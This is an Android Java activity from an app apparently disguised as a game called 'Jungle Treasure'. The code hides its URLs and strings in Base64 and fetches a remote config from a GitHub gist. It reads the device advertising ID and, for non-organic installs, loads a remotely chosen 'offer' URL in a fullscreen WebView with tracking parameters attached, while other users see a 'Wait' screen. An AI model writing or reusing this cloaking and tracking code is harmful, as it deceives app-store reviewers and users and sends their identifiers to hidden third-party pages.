package com.jeulng.terreuas;

import static com.jeulng.terreuas.AppsF.COMCYHRERRLOL_ID;
import static com.jeulng.terreuas.AppsF.appsIdJeulngTerreuas;
import static com.jeulng.terreuas.AppsF.parsStatusJeulngTerreuas;
import static com.jeulng.terreuas.AppsF.statusJeulngTerreuas;
import static com.jeulng.terreuas.Dev.START_JEULNG_TERREUAS;
import static com.jeulng.terreuas.FBL.DATA_JEULNG_TERREUAS;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebView;

import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.onesignal.OneSignal;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;


public class J8T extends AppCompatActivity {

    private ValueCallback<Uri> lllpooSave;
    public Uri sdddurid;
    public String cadfffmerajeulngterreuas;
    public static ValueCallback<Uri[]> FILE_JEULNG_TERREUAS;
    public static String PHOTO_JEULNG_TERREUAS;
    public static String IDDD_JEULNG_TERREUAS;
    private static String LIST_JEULNG_TERREUAS = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9SS0RldjExLzJkYzk5MjkwMjdiOGNhMjk3YmY3MTdhMDFjZGZmYmJlL3Jhdy9KdW5nbGUlMjUyMFRyZWFzdXJl";
    private String offJeulngTerreuas;
    private String devJeulngTerreuas;
    private String fbdJeulngTerreuas;
    private String sharedLinkJeulngTerreuas;
    public WebView webViewJeulngTerreuas;
    static String zamokJeulngTerreuas;
    static String s6JeulngTerreuas;
    static String s7JeulngTerreuas;
    static String s2JeulngTerreuas;
    static String s3JeulngTerreuas;
    static String s4JeulngTerreuas;
    static String s5JeulngTerreuas;
    public static String[] LA_JEULNG_TERREUAS;

    @Override
    protected void onActivityResult(int requestCodeJeulngTerreuas, int resultCodeJeulngTerreuas, @Nullable Intent dataJeulngTerreuas) {
        super.onActivityResult(requestCodeJeulngTerreuas, resultCodeJeulngTerreuas, dataJeulngTerreuas);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCodeJeulngTerreuas != 1 || FILE_JEULNG_TERREUAS == null) {
                super.onActivityResult(requestCodeJeulngTerreuas, resultCodeJeulngTerreuas, dataJeulngTerreuas);
                return;
            }
            Uri[] resultsSsetcerOefljgun = null;
            if (resultCodeJeulngTerreuas == Activity.RESULT_OK) {
                if (dataJeulngTerreuas == null || dataJeulngTerreuas.getData() == null) {
                    if (cadfffmerajeulngterreuas != null) {
                        resultsSsetcerOefljgun = new Uri[]{Uri.parse(cadfffmerajeulngterreuas)};
                    }
                } else {
                    String dataString = dataJeulngTerreuas.getDataString();
                    if (dataString != null) {
                        resultsSsetcerOefljgun = new Uri[]{Uri.parse(dataString)};
                    }
                }
            }
            FILE_JEULNG_TERREUAS.onReceiveValue(resultsSsetcerOefljgun);
            FILE_JEULNG_TERREUAS = null;
        }
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            if (requestCodeJeulngTerreuas == 1) {
                if (null == this.lllpooSave) {
                    return;
                }
                Uri resultSsetcerOefljgun = null;
                try {
                    if (resultCodeJeulngTerreuas != RESULT_OK) {
                        resultSsetcerOefljgun = null;
                    } else {
                        resultSsetcerOefljgun = dataJeulngTerreuas == null ? sdddurid : dataJeulngTerreuas.getData();
                    }
                } catch (Exception e) {

                }
                lllpooSave.onReceiveValue(resultSsetcerOefljgun);
                lllpooSave = null;
            }
        }

    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        webViewJeulngTerreuas = findViewById(R.id.webid);
        getWindow().addFlags(1024);
        WebSetting.jt = this;
        new OneSGOne(this);
        new Dev(this);
        new AppsF(this);
        new WebSetting(webViewJeulngTerreuas, this);



        if (START_JEULNG_TERREUAS == 1) {
            Intent intent = new Intent(this, Wait.class);
            startActivity(intent);
            finishAffinity();
        } else if (START_JEULNG_TERREUAS == 0) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        HttpURLConnection hufJeulngTerreuas = (HttpURLConnection) new URL(J8T.Refr(LIST_JEULNG_TERREUAS)).openConnection();
                        BufferedReader gufJeulngTerreuas = new BufferedReader(new InputStreamReader(hufJeulngTerreuas.getInputStream()));
                        String linJeulngTerreuas = gufJeulngTerreuas.readLine();
                        Split(linJeulngTerreuas);
                        IDDD_JEULNG_TERREUAS = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();

                    } catch (Exception e) {
                        Intent intent = new Intent(J8T.this, Wait.class);
                        startActivity(intent);
                        finishAffinity();
                    }
                    new FBL(fbdJeulngTerreuas, J8T.this);
                }
            }).start();
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    SharedPreferences ooJeulngTerreuas = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
                    sharedLinkJeulngTerreuas = ooJeulngTerreuas.getString(Refr("bG9sX2tleQ=="), null);

                    if (sharedLinkJeulngTerreuas != null) {
                        webViewJeulngTerreuas.setVisibility(View.VISIBLE);
                        webViewJeulngTerreuas.loadUrl(sharedLinkJeulngTerreuas);
                    } else {
                        new Handler().postDelayed(new Runnable() {
                            @Override
                            public void run() {

                                Perev(statusJeulngTerreuas, offJeulngTerreuas, parsStatusJeulngTerreuas,
                                        DATA_JEULNG_TERREUAS, devJeulngTerreuas);
                            }
                        }, 5000);
                    }
                }
            });
        }
    }

    public static String Refr(String line) {
        String def = new String(android.util.Base64.decode(line, Base64.DEFAULT));
        return def;
    }

    public void Split(String line) {
        String[] nastlist = line.split("\\u007c");
        offJeulngTerreuas = nastlist[0];
        devJeulngTerreuas = nastlist[1];
        fbdJeulngTerreuas = nastlist[2];
    }

    public void Perev(String statusJeulngTerreuas,
                      String offerJeulngTerreuas,
                      String paramsJeulngTerreuas,
                      String dataFbJeulngTerreuas,
                      String keyJeulngTerreuas) {


            if (statusJeulngTerreuas.equals(Refr("Tm9uLW9yZ2FuaWM="))) {
                String aaa = (offerJeulngTerreuas + paramsJeulngTerreuas);

                webViewJeulngTerreuas.loadUrl(aaa);
            } else if (dataFbJeulngTerreuas != null) {
                String aaa = (offerJeulngTerreuas + dataFbJeulngTerreuas);

                webViewJeulngTerreuas.loadUrl(aaa);
            } else {
                if (keyJeulngTerreuas.equals(Refr("Tk8="))) {
                    Intent intent = new Intent(J8T.this, Wait.class);
                    startActivity(intent);
                    finishAffinity();
                } else {
                    String exit = (keyJeulngTerreuas + Refr("P2J1bmRsZT0=") + Refr("Y29tLmpldWxuZy50ZXJyZXVhcw==") +
                            Refr("JmFkX2lkPQ==") + IDDD_JEULNG_TERREUAS + Refr("JmFwcHNfaWQ9") +
                            appsIdJeulngTerreuas + Refr("JmRldl9rZXk9") + Refr(COMCYHRERRLOL_ID));
                    String aaa = offerJeulngTerreuas + exit;


                    webViewJeulngTerreuas.loadUrl(aaa);
                }
            }
        }

    public static String aLa(String pars) {
        LA_JEULNG_TERREUAS = pars.split("::");

        try {
            zamokJeulngTerreuas = LA_JEULNG_TERREUAS[0];
        } catch (NullPointerException e) {
            zamokJeulngTerreuas = "";
        }
        try {
            s6JeulngTerreuas = LA_JEULNG_TERREUAS[1];
        } catch (NullPointerException e) {
            s6JeulngTerreuas = "";
        }
        try {
            s7JeulngTerreuas = LA_JEULNG_TERREUAS[2];
        } catch (NullPointerException e) {
            s7JeulngTerreuas = "";
        }
        try {
            s2JeulngTerreuas = LA_JEULNG_TERREUAS[3];
        } catch (NullPointerException e) {
            s2JeulngTerreuas = "";
        }
        try {
            s3JeulngTerreuas = LA_JEULNG_TERREUAS[4];
        } catch (NullPointerException e) {
            s3JeulngTerreuas = "";
        }
        try {
            s4JeulngTerreuas = LA_JEULNG_TERREUAS[5];
        } catch (NullPointerException e) {
            s4JeulngTerreuas = "";
        }
        try {
            s5JeulngTerreuas = LA_JEULNG_TERREUAS[6];
        } catch (NullPointerException e) {
            s5JeulngTerreuas = "";
        }

        OneSignal.sendTag(Refr("c3ViX2FwcA=="), s6JeulngTerreuas);
        String paramsNow = (zamokJeulngTerreuas + Refr("P2J1bmRsZT0=") + (BuildConfig.APPLICATION_ID)
                + Refr("JmFkX2lkPQ==") + IDDD_JEULNG_TERREUAS + Refr("JmFwcHNfaWQ9") + appsIdJeulngTerreuas +
                Refr("JmRldl9rZXk9") + Refr(COMCYHRERRLOL_ID) +
                Refr("JnN1YjY9") + s6JeulngTerreuas +
                Refr("JnN1Yjc9") + s7JeulngTerreuas +
                Refr("JnN1YjI9") + s2JeulngTerreuas +
                Refr("JnN1YjM9") + s3JeulngTerreuas +
                Refr("JnN1YjQ9") + s4JeulngTerreuas +
                Refr("JnN1YjU9") + s5JeulngTerreuas);
        return paramsNow;
    }

    @Override
    public void onBackPressed() {
        if (webViewJeulngTerreuas.isFocused() && webViewJeulngTerreuas.canGoBack()) {
            webViewJeulngTerreuas.goBack();
        }
    }
}